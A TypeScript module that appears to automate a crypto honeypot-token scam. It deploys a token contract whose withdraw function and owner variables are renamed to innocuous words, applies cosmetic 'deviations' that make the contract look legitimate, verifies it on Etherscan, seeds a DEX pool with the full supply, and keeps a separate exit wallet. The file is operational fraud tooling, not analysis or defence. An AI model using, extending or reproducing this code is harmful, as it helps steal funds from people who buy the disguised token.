import * as fs from 'fs';
import * as path from 'path';
import * as child_process from 'child_process';

import {ethers} from 'ethers';
import prompts from 'prompts';

import {ContractThunk, HoneypotContractProps, Resumable} from '../@types';
import {
  addInitialLiquidityToPool,
  deployHoneypotProject,
  getPairDetails,
  isAddressNonEmptyContractCode,
} from '../contracts';
import {getEnvironment} from '../environment';

const getResumablePath = () => {
  const {NODE_ENV} = getEnvironment();
  return path.resolve(`__RESUME__${NODE_ENV.toLocaleUpperCase()}__`);
};

const writeResumable = <T extends Resumable>(resumable: T): T => {

  // Ensure the deployed contract can be resumed.
  fs.writeFileSync(getResumablePath(), JSON.stringify(resumable, undefined, 2));

  return resumable;
};

export const DEFAULT_HONEYPOT_CONTRACT_PROPS: HoneypotContractProps = {
  contractName: 'babywandxx',
  tokenName: 'Baby Wand X',
  tokenSymbol: 'BWANDX',
  // TODO:
  addressToWithdrawVariable: 'partnership',
  ownerVariable: 'association',
  initialSupply: '540000000000',
  functionToWithdrawVariable: 'declaration',
  /* deviations */
  fixApprovalLogic: true,
  correctFilename: true,
  embedAsciiArt: true,
};

export const DEFAULT_INITIAL_LIQUIDITY = ethers.parseEther('0.5');

export const createContractProps = async (): Promise<HoneypotContractProps> => {

  const {initialSupply, ...extras} = await prompts([
    {
      type: 'text',
      name: 'contractName',
      message: 'Filename of the smart contract',
      initial: DEFAULT_HONEYPOT_CONTRACT_PROPS.contractName,
    },
    {
      type: 'text',
      name: 'tokenName',
      message: 'Name of the token',
      initial: DEFAULT_HONEYPOT_CONTRACT_PROPS.tokenName,
    },
    {
      type: 'text',
      name: 'tokenSymbol',
      message: 'Symbol of the token',
      initial: DEFAULT_HONEYPOT_CONTRACT_PROPS.tokenSymbol,
    },
    {
      type: 'text',
      name: 'functionToWithdrawVariable',
      message: 'Withdraw function name',
      initial: DEFAULT_HONEYPOT_CONTRACT_PROPS.functionToWithdrawVariable,
    },
    {
      type: 'text',
      name: 'ownerVariable',
      message: 'Owner variable name',
      initial: DEFAULT_HONEYPOT_CONTRACT_PROPS.ownerVariable,
    },
    {
      type: 'text',
      name: 'initialSupply',
      message: 'Initial supply',
      initial: `${String(Math.floor(90 * Math.random()) + 10)}0000000000`,
    },
  ]);

  // Ensure we were passed a valid BigInt.
  if (String(BigInt(initialSupply)) !== initialSupply)
    throw new Error(`Expected valid bigint string, encountered "${initialSupply}".`);

  return {
    ...DEFAULT_HONEYPOT_CONTRACT_PROPS,
    ...extras,
    initialSupply,
  };
};

export const getMaybeResumable = ({
  honeypotDeployer,
  exitWallet,
}: {
  readonly honeypotDeployer: ethers.HDNodeWallet;
  readonly exitWallet: ethers.HDNodeWallet;
}): Resumable | undefined => {


  if (!fs.existsSync(getResumablePath())) return undefined;

  const honeypotDeployerAddress = ethers.getAddress(honeypotDeployer.address);
  const exitWalletAddress = ethers.getAddress(exitWallet.address);

  const maybeResumable = JSON.parse(fs.readFileSync(getResumablePath(), 'utf-8')) as Resumable;

  if (!maybeResumable || typeof maybeResumable !== 'object')
    throw new Error(`Expected object, encountered ${typeof maybeResumable}.`);

  const {exitAddress, deployerAddress} = maybeResumable;

  const isMatchingDeployerAddress = ethers.getAddress(deployerAddress) === honeypotDeployerAddress;
  const isMatchingExitAddress = ethers.getAddress(exitAddress) === exitWalletAddress;

  if (!isMatchingDeployerAddress)
    throw new Error(
      `[Resumable]: Encountered unexpected deployerAddress, "${
        deployerAddress
      }" (expected "${
        honeypotDeployerAddress
      }").`
    );

  if (!isMatchingExitAddress)
    throw new Error(
      `[Resumable]: Encountered unexpected exitAddress, "${
        deployerAddress
      }" (expected "${
        honeypotDeployerAddress
      }").`
    );

  return maybeResumable;
};

export const createOrResumeHoneypot = async ({
  provider,
  honeypotDeployer,
  exitWallet,
}: {
  readonly provider: ethers.JsonRpcProvider;
  readonly honeypotDeployer: ethers.HDNodeWallet;
  readonly exitWallet: ethers.HDNodeWallet;
}): Promise<Resumable> => {

  const maybeResumable = getMaybeResumable({
    honeypotDeployer,
    exitWallet,
  });

  if (maybeResumable) {

    const {
      honeypotContractAddress,
      honeypotPairAddress: maybeHoneypotPairAddress,
    } = maybeResumable;

    const honeypotContractAddressHasCode = await isAddressNonEmptyContractCode({
      address: honeypotContractAddress,
      provider,
    });

    if (!honeypotContractAddressHasCode) throw new Error('Missing honeypot code.');

    // We can permit a pair address to not be defined, since this can be determined later - 
    // here we only verify validity of the contract if a previous execution did assert
    // a pair was created.
    if (typeof maybeHoneypotPairAddress !== 'string') return maybeResumable;

    const honeypotContractPairAddressHasCode = await isAddressNonEmptyContractCode({
      address: honeypotContractAddress,
      provider,
    });

    if (!honeypotContractAddressHasCode) throw new Error('Missing honeypot pair code.');

    return maybeResumable
  };

  const honeypotContractProps = await createContractProps();

  const {
    cwd: projectDir,
    contractAddress: honeypotContractAddress,
    abi,
  } = await deployHoneypotProject({
    honeypotContractProps,
    wallet: honeypotDeployer,
  });

  const resumable: Resumable = {
    projectDir,
    verified: false,
    honeypotContractAddress,
    honeypotContractProps,
    abi,
    deployerAddress: ethers.getAddress(honeypotDeployer.address),
    exitAddress: ethers.getAddress(exitWallet.address),
  };

  return writeResumable(resumable) /* ensure_resume */;
};

export const verifyHoneypotProject = async ({
  resumable,
}: {
  readonly resumable: Resumable;
}) => { 

  const {NODE_ENV, ETHERSCAN_API_KEY, CHAIN} = getEnvironment();

  if (NODE_ENV === 'test')
    throw new Error('Unable to verify within a test environment.');

  const {verified} = resumable;

  if (verified) throw new Error('Attempted to re-verify a verified contract.');

  const {
    projectDir: cwd,
    honeypotContractAddress,
    honeypotContractProps: {
      contractName,
    },
  } = resumable;

  const opts = {cwd} as const;

  child_process.execSync(
    `ETHERSCAN_API_KEY="${
      ETHERSCAN_API_KEY
    }" forge verify-contract ${
      honeypotContractAddress
    } ${
      contractName
    } --chain ${
      CHAIN
    } --verifier etherscan --watch --constructor-args $(cast abi-encode "constructor()") `,
    opts
  ) /* verify */;

  return writeResumable({...resumable, verified: true}) /* ensure_verified */;
};


export const createOrResumeHoneypotPair = async ({
  honeypotDeployer,
  resumable,
  getHoneypotContract,
  getRouterV2,
  getFactory,
  initialLiquidity,
  deadline,
}: {
  readonly honeypotDeployer: ethers.HDNodeWallet;
  readonly resumable: Resumable;
  readonly getHoneypotContract: ContractThunk;
  readonly getRouterV2: ContractThunk;
  readonly getFactory: ContractThunk;
  readonly initialLiquidity: bigint;
  readonly deadline: bigint;
}): Promise<Required<Resumable>> => {

  const {
    honeypotContractAddress,
    honeypotPairAddress: maybeHoneypotPairAddress,
  } = resumable;

  if (typeof maybeHoneypotPairAddress === 'string' && maybeHoneypotPairAddress.length)
    return {
      ...resumable,
      honeypotPairAddress: maybeHoneypotPairAddress,
    };

  // Else, we must create the pair contract by deploying liquidity.
  const {address: honeypotDeployerAddress} = honeypotDeployer;

  // We'll populate the pool with the full token amount.
  const honeypotTokenAmount = await getHoneypotContract(honeypotDeployer).balanceOf!(honeypotDeployerAddress);

  await addInitialLiquidityToPool({
    honeypotContractAddress,
    honeypotTokenAmount,
    routerV2: getRouterV2(honeypotDeployer),
    initialLiquidity,
    feeRecipient: honeypotDeployerAddress,
    deadline,
  });

  const {honeypotPairAddress} = await getPairDetails({
    getFactory,
    honeypotDeployer,
    honeypotContractAddress,
  });

  return writeResumable({...resumable, honeypotPairAddress}) /* ensure_pair_resume */;

};
